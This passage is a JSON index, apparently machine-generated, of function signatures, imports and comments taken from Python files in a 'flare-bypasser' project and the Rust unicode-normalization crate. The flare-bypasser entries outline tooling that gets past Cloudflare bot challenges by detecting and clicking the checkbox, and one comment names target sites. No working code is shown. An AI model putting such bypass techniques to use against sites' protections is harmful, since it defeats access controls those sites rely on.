          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 27,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media/flare-bypasser-arm/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser",
    "name": "flare-bypasser",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser==0.2.7',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug4',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser-test',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/utils/drission_page_solver/drission_page_solver.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, driver: ChromiumPage, max_retries=-1, log=True):",
          "def search_recursively_shadow_root_with_iframe(self, ele):",
          "def search_recursively_shadow_root_with_cf_input(self, ele):",
          "def locate_cf_button(self):",
          "def log_message(self, message):",
          "def click_verification_button(self):",
          "def is_bypassed(self):",
          "def bypass(self):",
          "def bypass_cloudflare(url: str, retries: int, log: bool, proxy: str = None) -> ChromiumPage:",
          "def main():"
        ],
        "class_defs": [
          "class CloudflareBypasser:"
        ],
        "imports": [
          "import sys",
          "import logging",
          "import time",
          "import numpy as np",
          "import argparse",
          "import cv2",
          "from pyvirtualdisplay import Display",
          "from DrissionPage import ChromiumPage, ChromiumOptions, WebPage"
        ],
        "comments": [
          "# If the button is not found, search it recursively",
          "# Start Xvfb for Docker"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url, *args, **kwargs):",
          "def http_client(self) -> httpx.AsyncClient:",
          "def _init_client(self):"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):",
          "class CloudFlareBlocked(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare unsolvable block",
          "# check that it is cloud flare block",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# \"--disable-software-rasterizer\",",
          "# Disable certificates checking",
          "# browser_args += [\"--ignore-certificate-errors\", \"--ignore-urlfetcher-cert-requests\"]",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 25,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):",
          "def _platform_for_error() -> str:"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 30,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class RunProxyCommandError(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25",
    "name": "unicode-normalization-0.1.25",
    "languages": [
      "Rust",
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-normalization-0.1.25/scripts/unicode.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def stats(name, table):",
          "def _fetch(self, filename):",
          "def _load_unicode_data(self):",
          "def _load_cjk_compat_ideograph_variants(self):",
          "def _load_norm_props(self):",
          "def _load_norm_tests(self):",
          "def _compute_canonical_comp(self):",
          "def _compute_fully_decomposed(self):\n\"\"\"\nEven though the decomposition algorithm is recursive, it is possible\nto precompute the recursion at table generation time with modest\nincrease to the table size.  Then, for these precomputed tables, we\nnote that 1) compatible decomposition is a subset of canonical\ndecomposition and 2) they mostly agree on their intersection.\nTherefore, we don't store entries in the compatible table for\ncharacters that decompose the same way under canonical decomposition.\n",
          "def _decompose(char_int, compatible):",
          "def _compute_stream_safe_tables(self):\n\"\"\"\nTo make a text stream-safe with the Stream-Safe Text Process (UAX15-D4),\nwe need to be able to know the number of contiguous non-starters *after*\napplying compatibility decomposition to each character.\n\nWe can do this incrementally by computing the number of leading and\ntrailing non-starters for each character's compatibility decomposition\nwith the following rules:\n",
          "def is_first_and_last(first, last):",
          "def gen_mph_data(name, d, kv_type, kv_callback, kv_row_width):",
          "def gen_combining_class(combining_classes, out):",
          "def gen_composition_table(canon_comp, out):",
          "def gen_decomposition_tables(canon_decomp, compat_decomp, cjk_compat_variants_decomp, out):",
          "def gen_qc_match(prop_table, out):",
          "def gen_nfc_qc(prop_tables, out):",
          "def gen_nfkc_qc(prop_tables, out):",
          "def gen_nfd_qc(prop_tables, out):",
          "def gen_nfkd_qc(prop_tables, out):",
          "def gen_combining_mark(general_category_mark, out):",
          "def gen_public_assigned(general_category_public_assigned, out):",
          "def gen_stream_safe(leading, trailing, out):",
          "def gen_tests(tests, out):\nout.write(\"\"\"#[derive(Debug)]\npub struct NormalizationTest {\npub source: &'static str,\npub nfc: &'static str,\npub nfd: &'static str,\npub nfkc: &'static str,\npub nfkd: &'static str,\n}\n",
          "def my_hash(x, salt, n):",
          "def minimal_perfect_hash(d):"
        ],
        "class_defs": [
          "class UnicodeData(object):"
        ],
        "imports": [
          "import collections",
          "import urllib.request",
          "from itertools import batched"
        ],
        "comments": [
          "#",
          "# Copyright 2011-2018 The Rust Project Developers. See the COPYRIGHT",
          "# file at the top-level directory of this distribution and at",
          "# http://rust-lang.org/COPYRIGHT.",
          "#",
          "# Licensed under the Apache License, Version 2.0 <LICENSE-APACHE or",
          "# http://www.apache.org/licenses/LICENSE-2.0> or the MIT license",
          "# <LICENSE-MIT or http://opensource.org/licenses/MIT>, at your",
          "# option. This file may not be copied, modified, or distributed",
          "# except according to those terms.",
          "# This script uses the following Unicode tables:",
          "# - DerivedNormalizationProps.txt",
          "# - NormalizationTest.txt",
          "# - UnicodeData.txt",
          "# - StandardizedVariants.txt",
          "#",
          "# Since this should not require frequent updates, we just store this",
          "# out-of-line and check the tables.rs and normalization_tests.rs files into git.",
          "# Mapping taken from Table 12 from:",
          "# http://www.unicode.org/reports/tr44/#General_Category_Values",
          "# Constants from Unicode 9.0.0 Section 3.12 Conjoining Jamo Behavior",
          "# http://www.unicode.org/versions/Unicode9.0.0/ch03.pdf#M9.32468.Heading.310.Combining.Jamo.Behavior",
          "# See ftp://ftp.unicode.org/Public/3.0-Update/UnicodeData-3.0.0.html",
          "# Don't use variations that only apply in particular shaping environments.",
          "# Look for entries where the description field is a codepoint name.",
          "# Only consider the CJK Compatibility Ideographs.",
          "# If we ever need to handle Hangul here, we'll need to handle it separately.",
          "# 7-bit ASCII never decomposes",
          "# Assert that we're handling Hangul separately.",
          "# Always skip Hangul, since it's more efficient to represent its",
          "# decomposition programmatically.",
          "# Since canon_fully_decomp is a subset of compat_fully_decomp, we don't",
          "# need to store their overlap when they agree.  When they don't agree,",
          "# store the decomposition in the compatibility table since we'll check",
          "# that first when normalizing to NFKD.",
          "# Test whether `first` and `last` are corresponding \"<..., First>\" and",
          "# \"<..., Last>\" markers.",
          "# The largest offset must fit in a u16.",
          "# This could be done as a hash but the table is somewhat small.",
          "# This could be done as a hash but the table is very small.",
          "# Guaranteed to be less than n.",
          "# This is hash based on the theory that multiplication is efficient",
          "# Compute minimal perfect hash function, d can be either a dict or list of keys.",
          "# Note: the traditional perfect hashing approach would also special-case",
          "# bucket_size == 1 here and assign any empty slot, rather than iterating",
          "# until rehash finds an empty slot. But we're not doing that so we can",
          "# avoid the branch.",
          "# Make sure there are no rehash collisions within this bucket.",
          "# Note: if this happens (because of unfortunate data), then there are",
